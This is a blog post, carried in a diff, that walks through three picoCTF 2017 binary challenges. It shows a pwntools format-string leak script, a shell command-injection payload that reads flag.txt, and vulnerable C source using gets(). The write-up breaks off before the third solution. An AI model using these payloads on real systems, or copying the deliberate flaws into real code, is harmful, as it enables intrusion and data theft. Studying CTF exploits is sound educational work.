@@ -1,0 +1,546 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="author" content="F3real" />
+        <meta name="keywords" content="ctf,pwnable,binary exploitation" />
+        <meta name="description" content="How to solve picoCTF Lvl2 remaining binary challenges" />
+
+
+    <title>PicoCTF 2017 Lvl2 Remaining binary challenges - EnSec blog</title>
+
+    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />
+
+    <!-- Feeds -->
+</head>
+<body data-spy="scroll" data-target="#scrollspy">
+    <div id="wrapper">
+        <!-- Sidebar -->
+        <nav id="sidebar-wrapper-small" class="twitchy-background">
+            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
+                <li>
+        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
+            <span class="fas fa-home"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
+            <span class="fas fa-th-list"></span>
+        </a>
+    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
+                        <i class="fas fa-users padding-small"></i>
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
+                    </li>
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+        <a href="#" title="Back to top" class="collapsed">
+            <span class="fas fa-arrow-up"></span>
+        </a>
+    </li>
+            </ul>
+        </nav>
+        <nav id="sidebar-wrapper" class="twitchy-background">
+            <ul id="accordion" class="sidebar-nav">
+                <li class="sidebar-brand">
+                    <a href="https://f3real.github.io/">
+                            <span class="fas fa-home padding-small"></span>
+                            EnSec blog
+                    </a>
+                </li>
+                    <li>
+                        <a href="https://f3real.github.io/archives.html">
+                            <span class="fas fa-th-list padding-small"></span>
+                            Archives
+                        </a>
+                    </li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
+                        <i class="fas fa-users padding-small"></i>
+                        Contact
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
+                    <li>
+                        <a href="https://github.com/F3real" title="Github">
+                            <i class="fab fa-github-square padding-small"></i>
+                            Github
+                        </a>
+                    </li>
+                    <li>
+                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
+                            <i class="fab fa-linkedin padding-small"></i>
+                            Linkedin
+                        </a>
+                    </li>
+                </ul></li>
+                
+                <li class="nav-divider"></li>
+                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
+                </ul></li>
+                <li class="nav-divider"></li>
+                <li>
+                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
+                        <i class="fas fa-folder-open padding-small"></i>
+                        Categories
+                    </a>
+                </li>
+                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
+                    <li class="active">
+                        <a href="https://f3real.github.io/category/ctf.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            ctf
+                            <span class="badge badge-secondary float-right categorybadge">28</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/misc.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            misc
+                            <span class="badge badge-secondary float-right categorybadge">15</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/reversing.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            reversing
+                            <span class="badge badge-secondary float-right categorybadge">6</span>
+                        </a>
+                    </li>
+                    <li >
+                        <a href="https://f3real.github.io/category/tutorial.html">
+                            <i class="fas fa-folder-open padding-small"></i>
+                            tutorial
+                            <span class="badge badge-secondary float-right categorybadge">5</span>
+                        </a>
+                    </li>
+                </ul></li>
+            </ul>
+        </nav>
+        <!-- /#sidebar-wrapper -->
+        <!-- open/close sidebar -->
+        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
+            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
+            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
+        </button>
+       <!-- /open/close sidebar -->
+
+        <!-- Page Content -->
+        <div id="page-content-wrapper">
+            <div class="container-fluid">
+<section id="content">
+    <article>
+        <div class="row">
+            <div class="col-lg-10">
+                <header class="page-header">
+                    <h1>
+                        <a href="https://f3real.github.io/picoCTF_lvl2Remaining.html"
+                           rel="bookmark"
+                           title="Permalink to PicoCTF 2017 Lvl2 Remaining binary challenges">
+                            PicoCTF 2017 Lvl2 Remaining binary challenges
+                        </a>
+                        <small>
+<div class="post-info">
+    <div class="publish-info-block">
+        <small>
+            <span class="published">
+                <i class="fa fa-calendar padding-small"></i><time datetime="2018-07-29T10:02:00+02:00"> Sun 29 July 2018</time>
+            </span>
+            <span class="category">
+                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
+            </span>
+            <span class="tags">
+                <i class="fa fa-tags padding-small"></i>
+                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/pwnable.html">pwnable</a> /                 <a href="https://f3real.github.io/tag/binary-exploitation.html">binary exploitation</a>            </span>
+        </small>
+    </div>
+</div><!-- /.post-info -->                        </small>
+                    </h1>
+                </header>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-lg-10">
+                <div class="entry-content">
+                    <p>In this post, we are going to take a look at three challenges from picoCTF 2017, which I think are simple enough that they can be grouped together.</p>
+<div class="toc">
+<ul>
+<li><a href="#1-ive-got-a-secret">1. Ive Got A Secret</a></li>
+<li><a href="#2-flagsay-1">2. Flagsay 1</a></li>
+<li><a href="#3-vr-gear-console">3. VR Gear Console</a></li>
+</ul>
+</div>
+<h2 id="1-ive-got-a-secret">1. Ive Got A Secret</h2>
+<blockquote>
+<p>Hopefully you can find the right format for my <a href="https://webshell2017.picoctf.com/static/7ea472826fbd769adc63da9f9a6d2fec/secret">secret</a>! <a href="https://webshell2017.picoctf.com/static/7ea472826fbd769adc63da9f9a6d2fec/secret.c">Source</a>. Connect on shell2017.picoctf.com:39169.</p>
+</blockquote>
+<p>Let’s look at the source code:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="cp">#define BUF_LEN 64</span>
+<span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">BUF_LEN</span><span class="p">];</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">**</span><span class="w"> </span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/dev/urandom&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">-1</span><span class="p">){</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Open error on /dev/urandom. Contact an admin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">secret</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">secret</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)){</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Read error. Contact admin!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to say!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">BUF_LEN</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">not_secret</span><span class="p">;</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Now tell my secret in hex! Secret: &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">    </span><span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%x&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">not_secret</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">secret</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">not_secret</span><span class="p">){</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Wow, you got it!&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;cat ./flag.txt&quot;</span><span class="p">);</span><span class="w">   </span>
+<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="w">        </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;As my friend says,</span><span class="se">\&quot;</span><span class="s">You get nothing! You lose! Good day, Sir!</span><span class="se">\&quot;</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>We see that the program is generating a random number and asking us for input, if we get the number right it prints us the flag. The vulnerability lies in:</p>
+<div class="highlight"><pre><span></span><code>printf(buffer);
+</code></pre></div>
+
+<p>Since no format string is specified, we can add <code>%x</code> to our input to read from the stack. This works because, if <code>printf</code> finds format string parameters (<code>%x</code> or similar) it expects arguments after it, if no arguments are given it will just read first thing off the stack.</p>
+<p>Since we are not sure where is <code>secret</code> written on the stack we can just specify enough <code>%x</code> to read as much as we can from the stack (keeping in mind size of <code>buffer</code>). We are going to use <code>12 * %08x</code>. so we can easier read the output.</p>
+<div class="highlight"><pre><span></span><code><span class="mf">1</span><span class="p">)</span><span class="mf">00000040.</span><span class="n">f7fc7c20</span><span class="mf">.08048792.00000001.</span><span class="n">ffffdd34</span><span class="mf">.552</span><span class="n">bcb3a</span><span class="mf">.00000003.</span><span class="n">f7fc73c4</span><span class="mf">.</span><span class="n">ffffdca0</span><span class="mf">.00000000.</span><span class="n">f7e37a63</span><span class="mf">.08048740.</span>
+<span class="mf">2</span><span class="p">)</span><span class="mf">00000040.</span><span class="n">f7fc7c20</span><span class="mf">.08048792.00000001.</span><span class="n">ffffdd34</span><span class="mf">.</span><span class="n">aa7d05a6</span><span class="mf">.00000003.</span><span class="n">f7fc73c4</span><span class="mf">.</span><span class="n">ffffdca0</span><span class="mf">.00000000.</span><span class="n">f7e37a63</span><span class="mf">.08048740.</span>
+</code></pre></div>
+
+<p>As we see most of the stack remains the same expect 6 byte which changes, so could that be the answer? Let's write <strong>pwntool</strong> script to automate this.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;tmux&#39;</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;shell2017.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">39169</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Give me something to say!&#39;</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%08x</span><span class="s1">.&#39;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span>  <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Now tell my secret in hex! Secret: &#39;</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">response</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+<span class="nb">print</span> <span class="n">payload2</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+<span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+<p>And running it, we see that our assumption is right and that we get the flag.</p>
+<p><img alt="Shell result of Ive Got A Secret" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_29_Secret.png"></p>
+<h2 id="2-flagsay-1">2. Flagsay 1</h2>
+<blockquote>
+<p>I heard you like flags, so now you can make your own! Exhilarating! Use <a href="https://webshell2017.picoctf.com/static/63c03a01d0f31a6c8ce7301d5c4005e5/flagsay-1">flagsay-1</a>! <a href="https://webshell2017.picoctf.com/static/63c03a01d0f31a6c8ce7301d5c4005e5/flagsay-1.c">Source</a>. Connect on shell2017.picoctf.com:37742.</p>
+</blockquote>
+<p>Let’s look at the source code:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+
+<span class="cp">#define FIRSTCHAROFFSET 129</span>
+<span class="cp">#define LINELENGTH 35</span>
+<span class="cp">#define NEWLINEOFFSET 21</span>
+<span class="cp">#define LINECOUNT 6</span>
+
+<span class="cp">#define BUFFLEN 1024</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;               _                                        </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;             //                                   /     </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;            //                                   /      </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;           //                                   /       </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;          //                                   /        </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;         //                                   /         </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;        //                                   /          </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;       //___________________________________/           </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;      //                                                </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;     //                                                 </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;    //                                                  </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;   //                                                   </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot;  //                                                    </span><span class="se">\n</span><span class="s">&quot;</span>
+<span class="w">              </span><span class="s">&quot; //                                                     </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="kt">char</span><span class="w"> </span><span class="n">commandBase</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;/bin/echo </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;\n</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">placeInFlag</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">str</span><span class="p">){</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">FIRSTCHAROFFSET</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">lastInLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">LINELENGTH</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">charRemaining</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">linesDone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="n">charRemaining</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">linesDone</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">LINECOUNT</span><span class="p">){</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">ptr</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">lastInLine</span><span class="p">){</span>
+<span class="w">            </span><span class="n">ptr</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">NEWLINEOFFSET</span><span class="p">;</span>
+<span class="w">            </span><span class="n">lastInLine</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">NEWLINEOFFSET</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">LINELENGTH</span><span class="p">;</span>
+<span class="w">            </span><span class="n">linesDone</span><span class="o">++</span><span class="p">;</span>
+<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="w">        </span><span class="n">ptr</span><span class="o">++</span><span class="p">;</span>
+<span class="w">        </span><span class="n">str</span><span class="o">++</span><span class="p">;</span>
+<span class="w">        </span><span class="n">charRemaining</span><span class="o">--</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="p">}</span>
+
+
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">flagSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">//need to remember null terminator</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">flagSize</span><span class="p">);</span>
+<span class="w">    </span><span class="n">input</span><span class="p">[</span><span class="n">flagSize</span><span class="mi">-1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\x0&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">flagSize</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">temp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">temp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">){</span>
+<span class="w">        </span><span class="n">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\x0&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">placeInFlag</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">commandLen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flagSize</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">commandBase</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">commandLen</span><span class="p">);</span>
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="n">commandLen</span><span class="p">,</span><span class="w"> </span><span class="n">commandBase</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>At first, the program may look confusing, but looking carefully we see that this is actually simple. It takes user input, inserts it into flag and prints result  using <code>system</code> and <code>echo</code>. Since user input is just passed to <code>system</code> call without modification we can just chain new commands by escaping <code>echo</code> using <code>“</code> and adding new commands. So let’s try it:</p>
+<div class="highlight"><pre><span></span><code>&quot;;ls; echo &quot;
+</code></pre></div>
+
+<p><img alt="Shell result of Flagsay ls" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_29_Flagsay1.png"></p>
+<p>We add <code>echo</code> at the end just to finish printing the rest of the flag but in any case, now we know the location of the flag and we can print it in the same way.</p>
+<div class="highlight"><pre><span></span><code>&quot;; cat flag.txt;echo &quot;
+</code></pre></div>
+
+<p>and we get our flag.</p>
+<p><img alt="Shell result of Flagsay cat" class="img-fluid centerimage" src="https://f3real.github.io/images/2018_7_29_Flagsay2.png"></p>
+<h2 id="3-vr-gear-console">3. VR Gear Console</h2>
+<blockquote>
+<p>Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here:  /problems/1444de144e0377e55e5c7fea042d7f01</p>
+</blockquote>
+<p>Let’s look at the source code:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">login</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">accessLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xff</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Username (max 15 characters): &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Password (max 31 characters): &quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;admin&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;{{ create_long_password() }}&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">accessLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;root&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;{{ create_long_password() }}&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">accessLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;artist&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;my-password-is-secret&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">accessLevel</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x80</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
